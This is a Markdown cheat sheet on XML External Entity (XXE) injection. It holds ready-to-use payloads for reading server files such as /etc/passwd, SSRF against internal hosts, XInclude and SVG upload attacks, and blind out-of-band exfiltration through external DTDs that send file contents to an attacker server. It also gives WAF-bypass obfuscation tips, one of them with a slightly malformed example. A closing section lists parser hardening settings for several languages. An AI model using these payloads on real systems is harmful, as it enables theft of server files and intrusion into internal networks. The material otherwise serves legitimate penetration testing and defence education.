# XML External Entity (XXE) Injection - Cheat Sheet & Tips

This document provides practical tips for identifying, exploiting, and preventing XML External Entity (XXE) injection vulnerabilities.

## 1. What is XXE?

XXE injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It can enable:
- Reading files on the application server.
- Interacting with back-end or external systems.
- In some cases, compromising the server via SSRF (Server-Side Request Forgery) attacks.

## 2. Types of XXE Attacks

| Attack Type | Description |
| :--- | :--- |
| **Exploiting XXE to retrieve files** | Define an external entity containing file contents, returned in the application's response. |
| **Exploiting XXE to perform SSRF** | Define an external entity based on a URL to interact with internal systems. |
| **Blind XXE** | Exploitation without visible response. Requires advanced techniques (OOB exfiltration, errors). |

## 3. How to Find XXE Vulnerabilities

- **Obvious attack surface:** Look for HTTP requests containing XML data (e.g., `Content-Type: application/xml`).
- **Hidden attack surface:**
    1.  **File uploads:** Test with XML-based formats like SVG or DOCX.
    2.  **Content-Type modification:** Change the `Content-Type` of a standard request (`application/x-www-form-urlencoded`) to `text/xml` or `application/xml` and send XML.
    3.  **XInclude attacks:** Use `<xi:include>` to attack points where you only control part of the XML document.

## 4. Exploitation - Basic Payloads

#### A. File Retrieval (e.g., /etc/passwd)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
Tip: Test each data field in the request (<productId>, <userId>, etc.) individually.

#### B. SSRF Attack (interact with internal system)
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.intra/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

#### C. XInclude Attack (when you don't control the entire document)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## 5. Blind XXE

When the entity content is not returned in the response.

#### A. Out-of-Band (OOB) Exfiltration - Technique 1 (via external DTD)
1.  **Main payload:**
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://<YOUR-SERVER>/malicious.dtd"> %xxe; ]>
```
2.  **`malicious.dtd` file (on your server):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<YOUR-SERVER>/?data=%file;'>">
%eval;
%exfil;
```
Note: `&#x25;` is the HTML encoding for the `%` character.

#### B. Out-of-Band (OOB) Exfiltration - Technique 2 (via parameter entities)
```xml
<!DOCTYPE foo [ 
<!ENTITY % xxe SYSTEM "http://<YOUR-SERVER>/payload.dtd">
%xxe;
]>
<stockCheck><productId>1</productId></stockCheck>
```
**payload.dtd**:
```xml
<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<YOUR-SERVER>/?data=%file;'>">
%eval;
%exfil;
```

#### C. Retrieval via Error Messages
Use a non-existent file to trigger an error that reveals directory contents or file data.
```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/nonexistent_file">
%xxe;
]>
<stockCheck><productId>1</productId></stockCheck>
```
Tip: Sometimes the error message reveals the exact path or expected content.

## 6. Advanced Attack Surfaces

- **Image uploads:** Use a malicious SVG file.
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200">
  <image xlink:href="file:///etc/hostname" />
</svg>
```
- **Content-Type modification:** If an application accepts XML even when a different content type is expected, simply change the header.

## 7. Prevention

The most effective method is to disable dangerous parser features.

- **Java (JAXP):**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false); // Disable XInclude
```

- **Python (lxml):**
```python
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

- **PHP:**
```php
libxml_disable_entity_loader(true);
```

- **.NET:**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.ProhibitDtd = true; // .NET 4.0 and earlier
// or
settings.DtdProcessing = DtdProcessing.Prohibit; // .NET 4.5 and later
```

## 8. Testing Tips

1.  **Automated scanning:** Use Burp Suite Scanner (it's very effective for XXE).
2.  **Test everything:** Don't forget fields, headers, cookies, and file uploads.
3.  **Collaborator:** Use Burp Collaborator for OOB exfiltration.
4.  **WAF bypass:** If a defense is in place, try obfuscating the payload.
    - Use HTML encodings (`&#x25;` for `%`).
    - Use comments to break WAF signatures.
```xml
<!--[<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">]>
%xxe;
```

**Best practice:** Always identify which parameter is vulnerable by testing it with a simple entity (e.g., `<!ENTITY test "TEST">`) before using external entities to avoid false positives.
